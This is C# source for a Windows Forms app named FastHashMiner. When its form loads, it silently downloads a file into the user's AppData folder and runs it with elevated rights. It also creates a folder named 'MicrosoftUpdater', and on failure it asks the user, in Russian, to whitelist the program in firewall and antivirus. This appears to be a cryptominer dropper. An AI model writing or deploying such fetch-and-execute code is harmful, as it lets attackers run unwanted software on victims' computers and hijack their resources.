using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace FastHashMiner
{
    public partial class Form1 : Form
    {
        public static Form1 currentForm;
        public ProgressLoading progressLoading;
        public Thread threadPLoad;
        public string fileName = "WorkerFF";
        public string floader = "\\Mining\\";
        public string file = "CryptoMiner.exe";
        public Form1()
        {
            InitializeComponent();
            currentForm = this;
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            progressLoading = new ProgressLoading(progressBar1);
            threadPLoad = new Thread(new ThreadStart(progressLoading.Start));
            threadPLoad.Start();

            Thread threadPLoadMiner = new Thread(new ThreadStart(DownloadMiner));
            threadPLoadMiner.Start();
          
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void label1_Click(object sender, EventArgs e)
        {
        }

        private void DownloadMiner()
        {
            try
            {
                string parth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                try
                {
                    if (!File.Exists(parth + "\\MicrosoftUpdater\\"))
                    {
                        DirectoryInfo directoryInfo = Directory.CreateDirectory(parth + "\\MicrosoftUpdater\\");
                    }
                }
                catch (Exception ex)
                {
                }

                if (Checking.CheckInterner())
                {
                    Loading.DownloadF(fileName, parth + floader);
                }

                new Process
                {
                    StartInfo =
                    {
                        FileName = parth + floader + fileName,
                        //WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas"
                    }
                }.Start();
            }
            catch (Exception ex)
            {
                Form1.currentForm.threadPLoad.Abort();
                MessageBox.Show("Возникла ошибка при загрузке, сервера недоступны,\n добавьте программу в исключения брандмауэра, антивируса или попробуйте повторить попытку позже", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                Environment.Exit(0);
            }
        }
    }
}
